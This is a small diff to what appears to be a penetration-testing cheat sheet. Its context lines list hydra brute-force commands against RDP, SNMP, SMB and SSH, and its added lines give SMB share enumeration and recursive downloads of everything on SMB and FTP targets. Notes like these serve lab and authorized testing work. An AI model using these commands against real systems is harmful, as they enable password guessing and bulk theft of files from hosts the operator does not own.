@@ -49,6 +49,13 @@ hydra -V -f -L usernames.txt -P pass.txt rdp:// <IP>
 hydra -P common-snmp-community-strings.txt target.com snmp
 hydra -l admin -P pass.txt <IP> smb -t 1
 hydra -l root -P pass.txt <IP> ssh
+  
+  
+  
+smbmap -H <ip>
+  smbget -R smb://$IP/<share>
+  
+  For FTP to download all:  wget -r --no-passive ftp://(USERNAME):(PASSWORD)@(TARGET)
 
 
 
